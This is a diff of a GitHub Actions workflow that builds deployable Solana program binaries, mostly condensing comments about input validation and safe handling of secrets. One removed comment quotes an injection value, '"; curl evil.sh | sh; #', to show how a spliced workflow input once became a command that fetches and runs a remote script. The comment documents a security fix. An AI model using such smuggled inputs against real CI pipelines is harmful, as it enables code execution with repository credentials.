@@ -1,29 +1,10 @@
 name: solana-deploy-artifact
 
-# Build a DEPLOYABLE tegridy-launch binary against identities the operator actually
-# holds, and publish it as an artifact.
-#
-# WHY THIS EXISTS
-# ---------------
-# The `solana-ci` build jobs deliberately patch in FRESHLY GENERATED throwaway keys
-# (`solana-keygen new` for both the program id and the devnet deployer). That is
-# correct for CI — it proves the program compiles and its constraints reject — but it
-# means those artifacts can never be deployed by us: nobody holds the keys they were
-# built against.
-#
-# And the SBF toolchain cannot be installed on the operator's Windows machine
-# (`Failed to install platform-tools: A required privilege is not held by the client`,
-# os error 1314 — it needs the symlink privilege). So there is NO local path to a
-# deployable `.so` at all. This workflow is it.
-#
-# It is arguably better than a local build anyway: a clean-checkout build on a
-# disposable runner is closer to something a third party can reproduce.
-#
-# WHAT IT DOES NOT DO
-# -------------------
-# It does not deploy. It builds and publishes; the operator runs
-# `solana program deploy` with the keys, so no signing key ever touches CI.
-# `workflow_dispatch` only — this never runs on push.
+# Builds a deployable program binary against identities the operator holds, from a
+# clean checkout, and publishes it as an artifact. solana-ci's builds patch in
+# throwaway keys, so nobody can deploy those. It never deploys: the operator runs
+# `solana program deploy` with the keys, so no signing key touches CI. Manual
+# dispatch only; it never runs on push.
 
 on:
   workflow_dispatch:
@@ -80,17 +61,9 @@ jobs:
 
       - name: Validate the identities BEFORE building
         if: inputs.program == 'tegridy-launch'
-        # AUDIT FIX TF-038: BOUND AS ENV VARS, NEVER SPLICED — the rule this
-        # file's own "Build" step states, and which these steps did not follow.
-        # `${{ }}` is substituted into the script TEXT before bash parses it, so
-        # a `program_id` of `"; curl evil.sh | sh; #` became a command, not a
-        # value. Note the bitter irony of the pre-fix code: the injection
-        # happened during substitution, so THIS step — the one whose whole job
-        # is to reject a malformed pubkey — executed the payload before its own
-        # regex ever ran. Validation downstream of interpolation validates
-        # nothing. `workflow_dispatch` needs repo write, so the blast radius is
-        # a collaborator rather than the public, but write access is not
-        # permission to run arbitrary code in a job holding the workflow token.
+        # The free-form inputs are bound as env vars, never spliced: an expression is
+        # pasted into the script text before bash parses it, so a crafted input would
+        # run as a command in the very step meant to reject it.
         env:
           PROGRAM_ID: ${{ inputs.program_id }}
           DEPLOYER: ${{ inputs.deployer }}
@@ -129,7 +102,7 @@ jobs:
       # would build something the guard never saw.
       - name: Pin the operator's identities into the source
         if: inputs.program == 'tegridy-launch'
-        # AUDIT FIX TF-038: env, not `${{ }}` splicing. See the validate step.
+        # Inputs through env, never spliced: see the validate step.
         env:
           PROGRAM_ID: ${{ inputs.program_id }}
           DEPLOYER: ${{ inputs.deployer }}
@@ -161,17 +134,12 @@ jobs:
           print(f"  patched declare_id! -> {program_id}")
           print(f"  patched deployer arm[{idx}] -> {deployer}  (cluster={cluster})")
           PY
-          # Anchor.toml must agree or `anchor build` rewrites the id back.
-          # AUDIT FIX TF-038: "$PROGRAM_ID" from env, never a spliced expression.
-          # It has already passed the base58 gate above, so it carries no `/`
-          # that could close sed's s/// or start a second command.
+          # Anchor.toml must agree or `anchor build` rewrites the id back. PROGRAM_ID
+          # passed the base58 gate above, so it carries no `/` to close sed's s///.
           sed -i "s/^tegridy_launch = \".*\"/tegridy_launch = \"$PROGRAM_ID\"/" ../../Anchor.toml || true
 
       - name: Build
-        # Inputs come through `env:`, never `${{ }}` inside the script: `${{ }}`
-        # is textual substitution performed BEFORE bash parses, so the value
-        # would be shell source rather than data. Same rule as contracts-ci's
-        # test matrix.
+        # Inputs through env, never spliced: see the validate step.
         env:
           CLUSTER: ${{ inputs.cluster }}
           SO_NAME: ${{ inputs.program == 'cp-swap' && 'raydium_cp_swap' || 'tegridy_launch' }}
@@ -207,8 +175,7 @@ jobs:
           ls -l "$SO"
 
       - name: Report what a deployer must check
-        # AUDIT FIX TF-038: env is per-step, so this step needs its own binding
-        # for the two free-form inputs it prints.
+        # env is per-step: the two free-form inputs this step prints are bound here.
         env:
           PROGRAM_ID: ${{ inputs.program_id }}
           DEPLOYER: ${{ inputs.deployer }}
@@ -229,8 +196,8 @@ jobs:
           echo "|---|---|" >> $GITHUB_STEP_SUMMARY
           echo "| cluster | \`${{ inputs.cluster }}\` |" >> $GITHUB_STEP_SUMMARY
           echo "| program | \`${{ inputs.program }}\` |" >> $GITHUB_STEP_SUMMARY
-          # AUDIT FIX TF-038: env, not splicing — an inline expression here lands in the
-          # script text just the same, and this step runs whatever it becomes.
+          # The free-form inputs come from env, never an inline expression: that would
+          # land in the script text, and this step runs whatever it becomes.
           echo "| program id | \`${PROGRAM_ID:-committed in source}\` |" >> $GITHUB_STEP_SUMMARY
           echo "| deployer | \`${DEPLOYER:-}\` |" >> $GITHUB_STEP_SUMMARY
           echo "| commit | \`${{ github.sha }}\` |" >> $GITHUB_STEP_SUMMARY
@@ -249,25 +216,12 @@ jobs:
           if-no-files-found: error
           retention-days: 30
 
-  # ─────────────────────────────────────────────────────────────────────────────
-  # bayla-ladder — the lock-ladder staking program.
-  #
-  # SEPARATE JOB, on purpose. Two things differ from the job above:
-  #
-  #  1. It builds with `anchor build`, not `cargo build-sbf`, because the IDL is
-  #     not optional here. `solana-ci` only ever produces the IDL inside a runner
-  #     and throws it away, so there is NO committed IDL and no way for anyone to
-  #     write a client. `cargo build-sbf` emits a `.so` and no IDL at all.
-  #  2. `anchor build` needs Anchor.toml, so it runs from the workspace root
-  #     rather than the program directory.
-  #
-  # The deployer gate is stricter than tegridy-launch's: `deployer::ID` is a
-  # COMPILE-TIME constant and BOTH cfg arms are `pubkey!`, the non-devnet one being
-  # the System-program sentinel `1111…` (fail-closed). So a mainnet build with no
-  # `deployer` input produces a binary whose `initialize_pool` NOBODY can call —
-  # the pool can never be created. `deployer` is therefore required in both
-  # clusters, and audit L-5 (deployer == program id makes initialize_pool demand a
-  # signature from a loader-owned account) is refused outright.
+  # bayla-ladder, the lock-ladder staking program, has its own job: it needs the IDL
+  # that only `anchor build` writes (none is committed), from the workspace root where
+  # Anchor.toml lives. `deployer::ID` is a compile-time constant whose non-devnet arm
+  # is the System Program sentinel, so without a `deployer` input nobody could call
+  # initialize_pool: it is required in both clusters. A deployer equal to the program
+  # id is refused for the same reason (audit L-5).
   build-ladder-deployable:
     if: inputs.program == 'bayla-ladder'
     runs-on: ubuntu-latest
@@ -280,10 +234,7 @@ jobs:
       - uses: dtolnay/rust-toolchain@4360b52568e2003a75bf9bc1d59f33a8e3fc893c # stable branch @ 2026-08-05
 
       - name: Validate the identities BEFORE building
-        # Same rule as the job above (audit fix TF-038): inputs are BOUND AS ENV
-        # VARS, never spliced into the script text. `${{ }}` substitutes before
-        # bash parses, so a crafted input would be executed by the very step whose
-        # job is to reject it.
+        # Inputs through env, never spliced: same rule as the job above.
         env:
           PROGRAM_ID: ${{ inputs.program_id }}
           DEPLOYER: ${{ inputs.deployer }}
@@ -313,9 +264,8 @@ jobs:
               assert len(b) == 32, f"{label} decodes to {len(b)} bytes, not 32 - NOT a pubkey"
               vals[label] = v
               print(f"  {label}: {v} -> 32 bytes OK")
-          # AUDIT L-5. This exact collision shipped once: deployer::ID equalled
-          # declare_id!, so initialize_pool demanded a signature from the program's
-          # OWN loader-owned address and no Pool could ever be created.
+          # Audit L-5: a deployer equal to the program id makes initialize_pool demand
+          # a signature from a loader-owned address, so no Pool could be created.
           assert vals["deployer"] != vals["program_id"], \
               "deployer MUST NOT equal the program id - audit L-5, initialize_pool would be uncallable"
           # The fail-closed sentinel is not a deployer.
@@ -350,14 +300,9 @@ jobs:
           src, n = re.subn(r'declare_id!\("[^"]+"\)', f'declare_id!("{program_id}")', src)
           assert n == 1, f"expected exactly 1 declare_id!, patched {n}"
 
-          # Patch ONLY the arm this build selects, so the other stays fail-closed
-          # rather than silently becoming live too.
-          #
-          # ANCHORED ON THE #[cfg] ATTRIBUTE, NOT ON ORDINAL POSITION. Selecting
-          # arms[0]/arms[1] assumed the devnet arm is written first; reorder the two
-          # arms in lib.rs and a devnet build would silently patch the MAINNET
-          # constant and still compile. The cfg-anchored form is the one the repo
-          # already proved next door in solana-ci.yml and cannot pick the wrong arm.
+          # Patch only the arm this build selects, so the other stays fail-closed. The
+          # arm is found by its #[cfg] attribute, never its position: reordering the
+          # arms in lib.rs must not make a devnet build patch the mainnet constant.
           marker = "pub mod deployer {"
           head, sep, tail = src.partition(marker)
           assert sep, "could not locate `pub mod deployer` - lib.rs layout changed"
@@ -412,16 +357,10 @@ jobs:
           CLUSTER: ${{ inputs.cluster }}
         run: |
           set -euo pipefail
-          # READ BACK FROM THE IDL, WHICH THE COMPILER WROTE.
-          #
-          # Comparing the patched source against the value used to patch it proves
-          # nothing - `re.subn` already asserted its own count, so a source-vs-input
-          # check is tautological and would pass even if the patch step were a
-          # complete no-op. The IDL is a different witness: `anchor build` emits it
-          # from the COMPILED constants, so it reports what actually went into the
-          # binary. `deployer::ID` surfaces there as the `address` pin on
-          # initialize_pool's `payer` account - which is exactly the constant whose
-          # being wrong makes initialize_pool uncallable (audit L-5).
+          # Read back from the IDL, which `anchor build` writes from the compiled
+          # constants: comparing the patched source with its own input would pass even
+          # if the patch were a no-op. `deployer::ID` shows there as the `address` pin
+          # on initialize_pool's `payer` account.
           python3 - "$PROGRAM_ID" "$DEPLOYER" "$CLUSTER" <<'PY'
           import json, sys
           want_id, want_deployer, cluster = sys.argv[1], sys.argv[2], sys.argv[3]
